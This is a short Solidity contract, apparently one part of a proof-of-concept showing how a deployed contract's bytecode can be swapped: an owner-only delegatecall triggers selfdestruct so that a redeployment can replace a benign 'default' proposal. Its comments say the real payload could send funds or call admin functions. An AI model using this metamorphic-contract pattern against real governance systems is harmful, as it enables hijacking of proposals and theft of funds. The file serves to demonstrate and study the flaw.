// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract AttackerDefaultProposal {
    
    address public owner;
    string public testResult;

    constructor() {
        owner = msg.sender;
    }

    /**
     * Used as a test to demonstrate that it is possible to change 
     * the bytecode of an already deployed contract.
     * In reality, this may be a more important function that can lead 
     * to critical consequences. For example, sending funds or calling an administrative function.
     */
    function test() external payable {
        testResult = "default";
    }

    /**
     * Used to call `selfdestruct` via `delegatecall`.
     * Any other implementation that allows `selfdestruct` to be called can be used. 
     * For example, even this:
     * function kill() external {
     *      selfdestruct(payable(msg.sender));
     * }
     */
    function delegateCall(
        address target,
        bytes memory data
    ) external {
        require(msg.sender == owner);
        (bool success, ) = target.delegatecall(data);
        require(success);
    } 
}